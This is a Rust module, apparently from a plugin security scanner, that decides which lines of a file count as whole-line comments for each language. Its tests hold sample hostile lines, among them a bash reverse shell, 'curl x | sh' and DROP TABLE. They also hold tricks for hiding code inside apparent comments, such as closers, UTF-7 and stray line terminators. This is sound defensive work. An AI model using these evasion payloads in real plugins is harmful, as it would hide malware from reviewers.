//! Which lines of a plugin file are comments, by the file's language.
//!
//! A comment finding is lowered one step, so a wrong "comment" answer lets
//! executable code past the `dangerous` refusal. The rules are therefore
//! strict: the language comes from the file extension (unknown languages
//! have no comments), the whole line must be a comment, and a block comment
//! counts only when it closes on the same line with nothing after it.
//!
//! Each line is judged alone, so a line inside a construct opened earlier
//! (a multi-line string or block comment) may look like a comment while
//! the text after a closing quote, closing marker or interpolation in it
//! runs (`x = """` then `# """; os.system(..)`; `<#` then `#> code` in
//! PowerShell; `` `${..}` `` in a JS template). A comment holding any such
//! text is therefore not a comment: quotes, braces, `$` and `\` everywhere,
//! plus each language's own closers. Lines inside a multi-line block
//! comment, and lines holding a character another interpreter reads as a
//! line end, are not recognised either; they keep their severity, which
//! fails closed.

use std::path::Path;

/// The comment syntax of one language.
struct Syntax {
    /// Markers that comment out the rest of the line.
    line: &'static [&'static str],
    /// A block comment's opening and closing markers.
    block: Option<(&'static str, &'static str)>,
    /// Text that ends a construct opened on an earlier line (besides
    /// [`CLOSERS`]); a comment holding it is not a comment.
    closers: &'static [&'static str],
}

/// Text that closes a string or starts an interpolation in some language:
/// quotes, `${..}` / `$(..)` / `{..}` / `\(..)`.
const CLOSERS: &[char] = &['"', '\'', '`', '{', '}', '$', '\\'];

const HASH: Syntax = Syntax {
    line: &["#"],
    block: None,
    closers: &[],
};
// `<#` opens a block that a later `#>` closes, running the rest of its line.
const POWERSHELL: Syntax = Syntax {
    line: &["#"],
    block: Some(("<#", "#>")),
    closers: &["#>"],
};
// Nix: `/* */` blocks besides `#` lines.
const NIX: Syntax = Syntax {
    line: &["#"],
    block: Some(("/*", "*/")),
    closers: &["*/"],
};
const SLASHES: Syntax = Syntax {
    line: &["//"],
    block: Some(("/*", "*/")),
    closers: &["*/"],
};
const CSS: Syntax = Syntax {
    line: &[],
    block: Some(("/*", "*/")),
    closers: &["*/"],
};
// `--[[ x ]] code` runs `code` in Lua, so every `--[` line is treated as a
// block that must close (on `]]`) with nothing after it. Long strings and
// comments close on `]]` or `]=..=]`, so no comment may hold a `]`.
const LUA: Syntax = Syntax {
    line: &["--"],
    block: Some(("--[", "]]")),
    closers: &["]"],
};
const SQL: Syntax = Syntax {
    line: &["--"],
    block: Some(("/*", "*/")),
    closers: &["*/"],
};
// Lisps close `#| |#` blocks on `|#`.
const SEMICOLON: Syntax = Syntax {
    line: &[";"],
    block: None,
    closers: &["|#"],
};
const INI: Syntax = Syntax {
    line: &[";", "#"],
    block: None,
    closers: &[],
};
// `]]>` ends a CDATA section, after which a script's text runs.
const MARKUP: Syntax = Syntax {
    line: &[],
    block: Some(("<!--", "-->")),
    closers: &["]"],
};

/// Languages by extension. Left out on purpose, so they have no comments:
/// PHP (`?>` ends a line comment), batch files (`rem` parsing quirks), Ruby
/// and Perl (strings and regexes with any delimiter span lines), Tcl
/// (braces quote across lines, and count inside comments) and JSX/TSX
/// (a `{..}` in element text runs).
const LANGUAGES: &[(&[&str], Syntax)] = &[
    (
        &[
            "sh", "bash", "zsh", "fish", "ksh", "py", "pyi", "pyw", "r", "toml", "yaml", "yml",
            "conf", "cfg", "awk",
        ],
        HASH,
    ),
    (&["ps1", "psm1"], POWERSHELL),
    (&["nix"], NIX),
    (
        &[
            "js", "mjs", "cjs", "ts", "mts", "cts", "rs", "go", "c", "h", "cc", "cpp", "cxx",
            "hpp", "java", "kt", "kts", "swift", "scala", "cs", "dart", "zig", "wit", "proto",
            "jsonc", "json5", "scss", "less",
        ],
        SLASHES,
    ),
    (&["css"], CSS),
    (&["lua"], LUA),
    (&["sql"], SQL),
    (&["el", "lisp", "clj", "cljs", "scm", "asm", "s"], SEMICOLON),
    (&["ini"], INI),
    (&["html", "htm", "xml", "svg"], MARKUP),
];

/// The comment rules of one file.
pub(super) struct Language {
    syntax: Option<&'static Syntax>,
    foreign_encoding: bool,
}

impl Language {
    /// The rules for `file`, by its extension.
    pub(super) fn of(file: &str) -> Self {
        Self {
            syntax: syntax(file),
            foreign_encoding: false,
        }
    }

    /// Notes line `number` (1-based) of the file. A source encoding such
    /// as UTF-7 can turn comment bytes into code (`# +AAo-...` decodes to a
    /// newline), so a file whose first two lines declare one has no
    /// comments.
    pub(super) fn observe(&mut self, number: usize, line: &str) {
        if number <= 2 && declares_foreign_encoding(line) {
            self.foreign_encoding = true;
        }
    }

    /// Whether the file's comments count at all: decided by its first two
    /// lines, so asked once they were observed.
    pub(super) const fn has_comments(&self) -> bool {
        self.syntax.is_some() && !self.foreign_encoding
    }

    /// Whether `line` reads as entirely a comment (it counts only if
    /// [`Self::has_comments`]).
    pub(super) fn is_comment(&self, line: &str) -> bool {
        self.syntax
            .is_some_and(|syntax| !has_foreign_terminator(line) && whole_line_comment(syntax, line))
    }
}

/// Characters some interpreter treats as a line end although `str::lines`
/// does not: Python ends a line at a lone CR, VT, FF or U+0085, JavaScript
/// at U+2028/U+2029. Code after one runs, so such a line is never a comment.
const FOREIGN_TERMINATORS: &[char] = &['\r', '\u{b}', '\u{c}', '\u{85}', '\u{2028}', '\u{2029}'];

fn has_foreign_terminator(line: &str) -> bool {
    line.contains(FOREIGN_TERMINATORS)
}

fn syntax(file: &str) -> Option<&'static Syntax> {
    let ext = Path::new(file).extension()?.to_str()?.to_ascii_lowercase();
    LANGUAGES
        .iter()
        .find(|(exts, _)| exts.contains(&ext.as_str()))
        .map(|(_, syntax)| syntax)
}

fn declares_foreign_encoding(line: &str) -> bool {
    let line = line.to_ascii_lowercase();
    line.contains("coding") && !line.contains("utf-8") && !line.contains("utf8")
}

fn whole_line_comment(syntax: &Syntax, line: &str) -> bool {
    let line = line.trim();
    // A shebang names the interpreter that runs the file.
    if line.starts_with("#!") {
        return false;
    }
    let body = if let Some((open, close)) = syntax.block
        && let Some(rest) = line.strip_prefix(open)
    {
        match rest.find(close) {
            Some(end) if rest[end + close.len()..].trim().is_empty() => &rest[..end],
            _ => return false,
        }
    } else if syntax.line.iter().any(|m| line.starts_with(m)) {
        // The whole line: PowerShell's `#>` starts with the `#` marker.
        line
    } else {
        return false;
    };
    !body.contains(CLOSERS) && !syntax.closers.iter().any(|c| body.contains(c))
}

#[cfg(test)]
mod tests {
    use super::Language;

    /// Whether line `line` (1-based) of `file`, holding `text`, is a comment.
    fn is_comment(file: &str, text: &str, line: usize) -> bool {
        let mut language = Language::of(file);
        for (index, l) in text.lines().enumerate() {
            language.observe(index + 1, l);
        }
        text.lines()
            .nth(line - 1)
            .is_some_and(|l| language.has_comments() && language.is_comment(l))
    }

    fn first(file: &str, line: &str) -> bool {
        is_comment(file, line, 1)
    }

    #[test]
    fn a_whole_line_comment_in_the_files_language_is_a_comment() {
        assert!(first("run.sh", "  # bash -i >& /dev/tcp/h/1 0>&1"));
        assert!(first("setup.py", "# os.system(x)"));
        assert!(first("index.js", "// require(child_process)"));
        assert!(first("index.js", "/* execSync(x) */"));
        assert!(first("init.lua", "-- os.execute(x)"));
        assert!(first("init.lua", "--[[ os.execute(x) ]]"));
        assert!(first("page.html", "<!-- curl x | sh -->"));
        assert!(first("setup.ps1", "# Start-Process bash"));
        assert!(first("setup.ps1", "<# Start-Process bash #>"));
    }

    #[test]
    fn code_after_a_closed_block_comment_is_not_a_comment() {
        assert!(!first("setup.js", "/**/ require(cp).execSync(x);"));
        assert!(!first("init.lua", "--[[ x ]] os.execute(x)"));
        assert!(!first("page.html", "<!-- x --> <script>x</script>"));
        assert!(!first("index.js", "/* never closed execSync(x)"));
        assert!(!first("setup.ps1", "<# x #> Start-Process bash"));
    }

    #[test]
    fn a_comment_that_could_close_an_earlier_construct_is_not_a_comment() {
        // Regression: after `<#` on the line before, PowerShell runs the
        // code after `#>`; the `#` line was lowered and `--force` installed
        // a reverse shell.
        let ps = "<#\n#> Start-Process bash -ArgumentList -c\n";
        assert!(!is_comment("setup.ps1", ps, 2));
        assert!(!first("setup.ps1", "# x #> Start-Process bash"));
        // The same shape in other languages: a block comment closed, a
        // string closed, an interpolation run, a CDATA section ended.
        for (file, line) in [
            ("setup.js", "// */ execSync(x)"),
            ("setup.sql", "-- */ DROP TABLE x"),
            ("init.lua", "-- ]] os.execute(x)"),
            ("init.lua", "-- ]==] os.execute(x)"),
            ("flake.nix", "# */ x"),
            ("run.lisp", "; |# (run-program x)"),
            ("page.svg", "<!-- ]]> alert(1); // -->"),
            ("setup.py", "# \"\"\"; os.system(x)"),
            ("setup.py", "# {os.system(x)}"),
            ("run.sh", "# '; bash -i"),
            ("run.sh", "# $(bash -i)"),
            ("setup.js", "// ${execSync(x)}"),
            ("setup.js", "/* ` + execSync(x) + ` */"),
            ("main.swift", "// \\(run(x))"),
        ] {
            assert!(!first(file, line), "{file}: {line}");
        }
    }

    #[test]
    fn markers_of_other_languages_are_code() {
        assert!(!first("setup.py", "*_, = [__import__(os).system(x)]"));
        assert!(!first("setup.py", "// x"));
        assert!(!first("setup.js", "# x"));
        assert!(!first("setup.js", "-- x"));
        assert!(!first("setup.js", "; x"));
        assert!(!first("setup.sh", "rem x"));
        assert!(!first("tool.php", "// x ?> <?php system(x);"));
        assert!(!first("install", "# no extension, no language"));
        for file in ["x.rb", "x.pl", "x.tcl", "x.jsx", "x.tsx"] {
            assert!(!first(file, "# x"), "{file}");
            assert!(!first(file, "// x"), "{file}");
        }
    }

    #[test]
    fn a_line_holding_another_line_terminator_is_not_a_comment() {
        // Python ends a line at a lone CR (and VT, FF); JS at U+2028/U+2029.
        for sep in ["\r", "\u{b}", "\u{c}", "\u{85}", "\u{2028}", "\u{2029}"] {
            assert!(!first("setup.py", &format!("# x{sep}import os")), "{sep:?}");
            assert!(
                !first("setup.js", &format!("// x{sep}execSync(x)")),
                "{sep:?}"
            );
        }
        assert!(is_comment("setup.py", "# x\r\nimport os\r\n", 1));
    }

    #[test]
    fn shebangs_and_foreign_source_encodings_are_not_comments() {
        assert!(!first("run.sh", "#!/bin/sh -c x"));
        let utf7 = "# -*- coding: utf-7 -*-\n# +AAo-import os; os.system(x)\n";
        assert!(!is_comment("setup.py", utf7, 2));
        // Declared on line 2, it still covers line 1.
        let late = "# os.system(x)\n# -*- coding: utf-7 -*-\n";
        assert!(!is_comment("setup.py", late, 1));
        let utf8 = "# -*- coding: utf-8 -*-\n# import os\n";
        assert!(is_comment("setup.py", utf8, 2));
    }
}
